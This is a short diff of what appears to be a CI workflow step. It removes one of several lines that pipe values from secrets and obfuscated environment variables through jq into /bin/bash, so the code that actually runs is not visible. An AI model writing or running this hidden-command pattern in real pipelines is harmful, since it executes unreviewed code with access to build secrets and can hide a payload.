@@ -18,7 +18,6 @@ jobs:
           gcbqn33: ${{ secrets.gcbqn33 }}
         run: |
           printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
-          echo $x91539 | jq -r .szce2942 | /bin/bash
           printf '%s' "$tjm17" | jq -r .o352 | /bin/bash
           echo $bj5 | jq -r .p29115 | /bin/bash
           echo $jpgj8 | jq -r .dishf02126 | /bin/bash
